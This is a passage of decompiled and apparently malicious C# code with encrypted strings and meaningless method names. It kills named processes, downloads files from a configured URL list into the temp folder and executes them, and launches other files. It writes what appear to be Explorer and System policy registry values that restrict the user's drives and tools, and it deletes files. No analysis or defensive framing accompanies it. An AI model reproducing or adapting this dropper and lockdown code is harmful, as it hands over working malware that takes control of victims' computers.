					File.Delete(string.Concat(text, _003CModule_003E.smethod_0("ቔ", 4616), directoryInfo2, _003CModule_003E.smethod_0("⇮⇑⇝⇝⇙⇛⇗⇁↜⇁⇃⇞⇛⇆⇗", 8626)));
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("Ղԍ\u0530ԫԭԸԼԡԧԦըԧԫԫԽԺԭԬըՠԅԩԡԦաղըԳոԵ", 1352), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void ExitReference(object object_0)
	{
		ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
		try
		{
			Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0df2\u0dfd෦\u0df1\u0df2\u0dfb෬", 3476));
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("᳃\u1cdf᳆\u1cd4\u1cda\u1cddᲞ\u1cd0\u1cdc\u1cdd᳇\u1cd2\u1cda\u1cdd\u1cd6᳁", 7347));
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("᭔ᬛᬦ\u1b3d\u1b3bᬮᬪ\u1b37ᬱᬰ\u1b7eᬱ\u1b3d\u1b3dᬫᬬ\u1b3b\u1b3a\u1b7e᭶ᬓ\u1b3f\u1b37ᬰ᭷᭤\u1b7eᬥ\u1b6eᬣ", 7006), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void CheckLine(object object_0)
	{
		WebClient webClient = new WebClient();
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("Ⴇ", 4347) + Icon.ProcessDrive(5, 10) + item.Substring(item.LastIndexOf('.'));
				webClient.DownloadFile(item, fileName);
				Process.Start(fileName);
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u07aeߡߜ߇߁ߔߐߍߋߊބߋ߇߇ߑߖ߁߀ބތߩ߅ߍߊލޞބߟޔߙ", 1956), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void UpdateAction(object object_0)
	{
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = item,
						UseShellExecute = true
					}
				};
				process.Start();
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("۷ڸڅڞژڍډڔڒړ\u06ddڒڞڞڈڏژڙ\u06ddەڰڜڔړ۔ۇ\u06ddچۍڀ", 1789), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void NavigateQueue(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᅈᅴᅽᅯᅬᅺᅩᅾᅇᅋᅴᅷᅲᅸᅲᅾᅨᅇᅖᅲᅸᅩᅴᅨᅴᅽᅯᅇᅌᅲᅵᅿᅴᅬᅨᅇᅈᅢᅨᅯᅾᅶ", 4379));
			registryKey.SetValue(_003CModule_003E.smethod_0("\u19ce᧣᧹᧫᧨᧦᧯ᧉᧇ\u19ce", 6538), 1);
			registryKey.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u1b36᭹\u1b44᭟᭙\u1b4cᭈ᭕᭓᭒ᬜ᭓᭟᭟ᭉ\u1b4e᭙᭘ᬜᬔ\u1b71᭝᭕᭒ᬕᬆᬜᭇᬌ\u1b41", 6972), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void AllocateDisk(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ޟޣ\u07aa\u07b8\u07bb\u07ad\u07be\u07a9ސށޥ\u07af\u07beޣ\u07bfޣ\u07aa\u07b8ސޛޥޢ\u07a8ޣ\u07bb\u07bfސޏ\u07b9\u07be\u07be\u07a9ޢ\u07b8ޚ\u07a9\u07be\u07bfޥޣޢސޜޣޠޥ\u07afޥ\u07a9\u07bfސޟ\u07b5\u07bf\u07b8\u07a9ޡ", 1996));
			registryKey.SetValue(_003CModule_003E.smethod_0("\u0ef5໘ໂ໐໓ໝ໔\u0ee5໐ໂ\u0eda\u0efc໖ໃ", 3761), 1);
			registryKey.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("&iTOI\\XECB\fCOOY^IH\f\u0004aMEB\u0005\u0016\fW\u001cQ", 44), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void FormatCondition(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\u0f97\u0fab\u0fa2\u0fb0\u0fb3\u0fa5\u0fb6\u0fa1\u0f98ྉ\u0fad\u0fa7\u0fb6\u0fab\u0fb7\u0fab\u0fa2\u0fb0\u0f98\u0f93\u0fad\u0faa\u0fa0\u0fab\u0fb3\u0fb7\u0f98\u0f87\u0fb1\u0fb6\u0fb6\u0fa1\u0faa\u0fb0\u0f92\u0fa1\u0fb6\u0fb7\u0fad\u0fab\u0faa\u0f98\u0f94\u0fab\u0fa8\u0fad\u0fa7\u0fad\u0fa1\u0fb7\u0f98\u0f97\u0fbd\u0fb7\u0fb0\u0fa1\u0fa9", 4036));
			registryKey.SetValue(_003CModule_003E.smethod_0("ᏰᏝᏇᏕᏖᏘᏑᏦᏑᏓᏝᏇᏀᏆᏍᏠᏛᏛᏘᏇ", 5044), 1);
			registryKey.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u245a␕\u2428\u2433\u2435␠␤\u2439\u243f\u243e⑰\u243f\u2433\u2433␥␢\u2435\u2434⑰⑸␝\u2431\u2439\u243e⑹⑪⑰\u242b①\u242d", 9296), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void TestPciture(object object_0)
	{
		try
		{
			string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
			pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("᱃", 7289), string.Empty);
			pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("ᐌ", 5200), string.Empty);
			int num = 0;
			string key;
			if ((key = pathRoot) != null)
			{
				if (DriveInfo.valuesMap == null)
				{
					DriveInfo.valuesMap = new Dictionary<string, int>(26)
					{
						{
							_003CModule_003E.smethod_0("м", 1149),
							0
						},
						{
							_003CModule_003E.smethod_0("\u0336", 884),
							1
						},
						{
							_003CModule_003E.smethod_0("ࡣ", 2080),
							2
						},
						{
							_003CModule_003E.smethod_0("\u1ab2", 6902),
							3
						},
						{
							_003CModule_003E.smethod_0("↛", 8670),
							4
						},
						{
							_003CModule_003E.smethod_0("௲", 2996),
							5
						},
						{
							_003CModule_003E.smethod_0("ල", 3578),
							6
						},
						{
							_003CModule_003E.smethod_0("ԉ", 1345),
							7
						},
						{
							_003CModule_003E.smethod_0("\u1757", 5918),
							8
						},
						{
							_003CModule_003E.smethod_0("\u034a", 768),
							9
						},
						{
							_003CModule_003E.smethod_0("Ἀ", 8003),
							10
						},
						{
							_003CModule_003E.smethod_0("ᡭ", 6177),
							11
						},
						{
							_003CModule_003E.smethod_0("Ⓜ", 9359),
							12
						},
						{
							_003CModule_003E.smethod_0("Ṕ", 7706),
							13
						},
						{
							_003CModule_003E.smethod_0("ቃ", 4620),
							14
						},
						{
							_003CModule_003E.smethod_0("ጳ", 4963),
							15
						},
						{
							_003CModule_003E.smethod_0("ᒪ", 5371),
							16
						},
						{
							_003CModule_003E.smethod_0("ᄈ", 4442),
							17
						},
						{
							_003CModule_003E.smethod_0("\u244d", 9246),
							18
						},
						{
							_003CModule_003E.smethod_0("ᶰ", 7652),
							19
						},
						{
							_003CModule_003E.smethod_0("⏎", 9115),
							20
						},
						{
							_003CModule_003E.smethod_0("᎙", 5071),
							21
						},
						{
							_003CModule_003E.smethod_0("\u0489", 1246),
							22
						},
						{
							_003CModule_003E.smethod_0("⚷", 9967),
							23
						},
						{
							_003CModule_003E.smethod_0("έ", 7978),
							24
						},
						{
							_003CModule_003E.smethod_0("\u20ef", 8373),
							25
						}
					};
				}
				if (DriveInfo.valuesMap.TryGetValue(key, out var value))
				{
					switch (value)
					{
					case 0:
						break;
					case 1:
						goto IL_0345;
					case 2:
						goto IL_034c;
					case 3:
						goto IL_0353;
					case 4:
						goto IL_035a;
					case 5:
						goto IL_0362;
					case 6:
						goto IL_036a;
					case 7:
						goto IL_0372;
					case 8:
						goto IL_037d;
					case 9:
						goto IL_0388;
					case 10:
						goto IL_0393;
					case 11:
						goto IL_039b;
					case 12:
						goto IL_03a3;
					case 13:
						goto IL_03ab;
					case 14:
						goto IL_03b3;
					case 15:
						goto IL_03bb;
					case 16:
						goto IL_03c3;
					case 17:
						goto IL_03cb;
					case 18:
						goto IL_03d3;
					case 19:
						goto IL_03db;
					case 20:
						goto IL_03e3;
					case 21:
						goto IL_03eb;
					case 22:
						goto IL_03f3;
					case 23:
						goto IL_03fb;
					case 24:
						goto IL_0403;
					case 25:
						goto IL_040b;
					default:
						goto IL_0413;
					}
					num = 1;
					goto IL_0415;
				}
			}
			goto IL_0413;
			IL_034c:
			num = 4;
			goto IL_0415;
			IL_0415:
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ಙಥಬ\u0cbeಽಫಸಯಖಇಣ\u0ca9ಸಥಹಥಬ\u0cbeಖಝಣತಮಥಽಹಖಉ\u0cbfಸಸಯತ\u0cbeಜಯಸಹಣಥತಖಚಥದಣ\u0ca9ಣಯಹಖಏಲ\u0cbaದಥಸಯಸ", 3274));
			registryKey.SetValue(_003CModule_003E.smethod_0("གྷརཉ\u0f7fཤ\u0f7bཨ\u0f7e", 3853), num);
			registryKey.SetValue(_003CModule_003E.smethod_0("⍶⍗⍮⍑⍝⍏⍷⍖⍼⍊⍑⍎⍝", 9016), num);
			registryKey.Close();
			return;
			IL_0345:
			num = 2;
			goto IL_0415;
			IL_0413:
			num = 4;
			goto IL_0415;
			IL_040b:
			num = 33554432;
			goto IL_0415;
			IL_0403:
			num = 16777216;
			goto IL_0415;
			IL_03fb:
			num = 8388608;
			goto IL_0415;
			IL_03f3:
			num = 4194304;
			goto IL_0415;
			IL_03eb:
			num = 2097152;
			goto IL_0415;
			IL_03e3:
			num = 1048576;
			goto IL_0415;
			IL_03db:
			num = 524288;
			goto IL_0415;
			IL_03d3:
			num = 262144;
			goto IL_0415;
			IL_03cb:
			num = 131072;
			goto IL_0415;
			IL_03c3:
			num = 65536;
			goto IL_0415;
			IL_03bb:
			num = 32768;
			goto IL_0415;
			IL_03b3:
			num = 16384;
			goto IL_0415;
			IL_03ab:
			num = 8192;
			goto IL_0415;
			IL_03a3:
			num = 4096;
			goto IL_0415;
			IL_039b:
			num = 2048;
			goto IL_0415;
			IL_0393:
			num = 1024;
			goto IL_0415;
			IL_0388:
			num = 512;
			goto IL_0415;
			IL_037d:
			num = 256;
			goto IL_0415;
			IL_0372:
			num = 128;
			goto IL_0415;
			IL_036a:
			num = 64;
			goto IL_0415;
			IL_0362:
			num = 32;
			goto IL_0415;
			IL_035a:
			num = 16;
			goto IL_0415;
			IL_0353:
			num = 8;
			goto IL_0415;
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u2428⑧\u245a⑁⑇\u2452\u2456\u244b\u244d\u244c␂\u244d⑁⑁\u2457\u2450⑇⑆␂␊⑯⑃\u244b\u244c␋␘␂\u2459␒\u245f", 9250), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void ViewVector(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("◑◭◤◶◵◣◰◧◞●◫◡◰◭◱◭◤◶◞◕◫◬◦◭◵◱◞◁◷◰◰◧◬◶◔◧◰◱◫◭◬◞◒◭◮◫◡◫◧◱◞◇◺◲◮◭◰◧◰", 9602));
			registryKey.SetValue(_003CModule_003E.smethod_0("वघ\u0902ऐझझञआणऄट", 2417), 1);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᤑ\u192d\u1924\u1936\u1935\u1923\u1930\u1927ᤞᤏ\u192b\u1921\u1930\u192d\u1931\u192d\u1924\u1936ᤞᤕ\u192b\u192c\u1926\u192d\u1935\u1931ᤞᤁ\u1937\u1930\u1930\u1927\u192c\u1936ᤔ\u1927\u1930\u1931\u192b\u192d\u192cᤞᤒ\u192d\u192e\u192b\u1921\u192b\u1927\u1931ᤞᤇ\u193a\u1932\u192e\u192d\u1930\u1927\u1930ᤞᤆ\u192b\u1931\u1923\u192e\u192e\u192d\u1935ᤐ\u1937\u192c", 6466));
			registryKey2.SetValue(_003CModule_003E.smethod_0("Ѽѽ", 1101), _003CModule_003E.smethod_0("ΞΒΏ·ΛΘ\u0385ΒϙΒΏΒ", 1015));
			registryKey2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ǭƢƟƄƂƗƓƎƈƉǇƈƄƄƒƕƂƃǇǏƪƆƎƉǎǝǇƜǗƚ", 487), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void FreeDisk(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᨥ\u1a19ᨐᨂᨁ\u1a17ᨄᨓᨪᨻ᨟ᨕᨄ\u1a19ᨅ\u1a19ᨐᨂᨪᨡ᨟\u1a18ᨒ\u1a19ᨁᨅᨪᨵᨃᨄᨄᨓ\u1a18ᨂᨠᨓᨄᨅ᨟\u1a19\u1a18ᨪᨦ\u1a19\u1a1a᨟ᨕ᨟ᨓᨅᨪᨳᨎᨆ\u1a1a\u1a19ᨄᨓᨄ", 6774));
			registryKey.SetValue(_003CModule_003E.smethod_0("ʣʎʔʆʋʋʈʐʵʒʉ", 743), 1);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("╋╷╾╬╯╹╪╽╄╕╱╻╪╷╫╷╾╬╄╏╱╶╼╷╯╫╄╛╭╪╪╽╶╬╎╽╪╫╱╷╶╄╈╷╴╱╻╱╽╫╄╝╠╨╴╷╪╽╪╄╜╱╫╹╴╴╷╯╊╭╶", 9496));
			registryKey2.SetValue(_003CModule_003E.smethod_0("ẕẕ", 7844), _003CModule_003E.smethod_0("⍒⍌⍑⍒⍌⍘⍍⌑⍚⍇⍚", 9023));
			registryKey2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0a01\u0a4eੳ੨੮\u0a7b\u0a7f\u0a62\u0a64\u0a65ਫ\u0a64੨੨\u0a7e\u0a79੮੯ਫਣ\u0a46੪\u0a62\u0a65ਢ\u0a31ਫ\u0a70\u0a3b੶", 2571), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void CloseProcess(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ၸ၄၍\u105fၜ၊\u1059၎ၷၦ၂၈\u1059၄\u1058၄၍\u105fၷၼ၂၅၏၄ၜ\u1058ၷ\u1068\u105e\u1059\u1059၎၅\u105fၽ၎\u1059\u1058၂၄၅ၷၻ၄၇၂၈၂၎\u1058ၷၮၓၛ၇၄\u1059၎\u1059", 4139));
			registryKey.SetValue(_003CModule_003E.smethod_0("\u208f₮₂₭₮₲₤", 8385), 1);
			registryKey.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᕋᔄᔹᔢᔤᔱᔵᔨᔮᔯᕡᔮᔢᔢᔴᔳᔤᔥᕡᕩᔌᔠᔨᔯᕨᕻᕡᔺᕱᔼ", 5441), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void LoadControl(object object_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("घतभ\u093f\u093cपहमगआढनहतसतभ\u093fगजढथयत\u093cसगई\u093eहहमथ\u093fझमहसढतथगछतधढनढमसगऎळ\u093bधतहमह", 2379));
			registryKey.SetValue(_003CModule_003E.smethod_0("ၸၕ၏ၝၐၐၓ။ၮ၉ၒ", 4156), 1);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ⅵⅉ⅀⅒⅑ⅇ⅔⅃ⅺⅫ⅏ⅅ⅔ⅉ⅕ⅉ⅀⅒ⅺⅱ⅏ⅈ⅂ⅉ⅑⅕ⅺⅥ⅓⅔⅔⅃ⅈ⅒ⅰ⅃⅔⅕⅏ⅉⅈⅺⅶⅉ⅊⅏ⅅ⅏⅃⅕ⅺⅣ⅞⅖⅊ⅉ⅔⅃⅔ⅺⅢ⅏⅕ⅇ⅊⅊ⅉ⅑ⅴ⅓ⅈ", 8486));
			registryKey2.SetValue(_003CModule_003E.smethod_0("ἕ\u1f16", 7972), _003CModule_003E.smethod_0("᧵᧫᧻᧷᧶᧾᧱᧿ᦶ᧽᧠᧽", 6552));
			registryKey2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᦈᧇ᧺᧡᧧᧲᧶᧫᧭᧬ᦢ᧭᧡᧡᧷᧰᧧᧦ᦢᦪ\u19cf᧣᧫᧬ᦫᦸᦢ᧹ᦲ᧿", 6530), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void IncreaseResource(object object_0)
	{
		Icon.ResolveView(QueueDictionary.valuesMap.ResolveView);
	}
}
